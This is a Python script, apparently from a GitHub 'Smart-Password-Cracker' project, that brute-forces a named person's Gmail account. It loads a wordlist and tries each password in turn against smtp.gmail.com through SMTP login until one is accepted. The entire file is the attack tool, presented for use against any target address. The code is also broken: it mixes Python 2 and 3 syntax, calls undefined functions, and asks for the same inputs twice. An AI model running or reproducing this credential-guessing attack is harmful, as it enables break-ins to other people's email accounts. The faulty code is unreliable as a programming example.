#!/usr/bin/env python
import time
import sys
import re
import os
import socket
import smtplib
import subprocess
#===[Database of script here]====================================================================================
alpha = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
num = [1,2,3,4,5,6,7,8,9,0]
special = ["~","!","@","#","^","*","(",")","-","+"]
#==================================================================================================================
def prRed(skk): print("\033[91m {}\033[00m" .format(skk)) 
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk)) 
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk)) 
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk)) 
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk)) 
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk)) 
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk)) 
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk)) 
mawar = "\033[31;1m"
#=========================================================================
#this is symbol of program
#------------------------------------------- 
def main():
   prRed("        Created by [X - Society]     ")
   prRed("        -------------------------    ") 
   prRed("      __  __  __  __    _    _    _  ")
   prRed("	\ \/ / |  \/  |  / \  | \ | |  ")
   prRed("	 \  /  | |\/| | / _ \ |  \| |  ")
   prRed("	 /  \  | |  | |/ ___ \| |\  |  ")
   prRed("	/_/\_\ |_|  |_/_/   \_\_| \_|  ")
   prRed("                                      ") 
   prRed(" [+] Version 1.0")
   prRed(" [+] Visit us https://github.com/Ashutoshkumargautam/Smart-Password-Cracker")
   prYellow("==============================================================================")
main()
#end here
#==================================================================================================================
prGreen(" [1] start the attack")
prRed(" [2] exit")
#==================================================================================================================
#Taking input from user.
option = input('==[')
if option == 1:
	#taking first information file location here...
	user_input_0 = raw_input(mawar+"  [+] Enter the path of your Info.txt file: ")
	#now taking user own wordlist file location here....
	user_input_1 = raw_input(mawar+"  [+] Enter the path of your own wordlist file: ")
else:
   system('clear')
   exit()
#==================================================================================================================
#====[user_input[1]]========================================================================================
assert os.path.exists(user_input_0), " [+] I did not find the file at, "+str(user_input_0)
f = open(user_input_0,'r+')
prRed(" [+] Info.txt File founded --> [ok]")
f.close()
#====[user_input[2]]========================================================================================
assert os.path.exists(user_input_1), " [+] I did not find the file at, "+str(user_input_1)
f = open(user_input_1,'r+')
prRed(" [+] wordlist.txt File founded --> [ok]")
f.close()
#========[Reading file here[0]]========================================================================
f = open(str(user_input_0),"r+")
input_1 = f.read()
f.close()
#========[Reading file here[1]]========================================================================
f = open(str(user_input_1),"r+")
input_2 = f.read()
f.close()
#==========================================================================================
time.sleep(0.1)
#==========================================================================================
#Now here we will create magic 
#==========================================================================================
f = open(str(user_input_1), "r")
L = f.readlines()
file1 = open('wordlist_1.txt', 'w') 
file1.writelines((L)) 
file1.close() 
  
# Using readline() 
file1 = open('wordlist_1.txt', 'r') 
count = 0
  
while True: 
    count += 1
  
    # Get next line from file 
    line = file1.readline() 
  
    # if line is empty 
    # end of file is reached 
    if not line: 
        break
file1.close() 
prRed(" [+] Done successfully --> [Wordlist_1.txt]")
#==========================================================================================
user = input(mawar+"  [+] Enter The Target Gmail Adress => ")
prRed(" [+] Now attacking with file --> [Wordlist_1.txt]")
passswfile = "wordlist_1.txt"
#==========================================================================================
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!] Enter Email Target: ")
passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!] Password Detected :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Password Zonk!:" + password
                            break
                else:
                        print mawar+"-->[!] Password Zonk!:" + password
#=========================================================================================
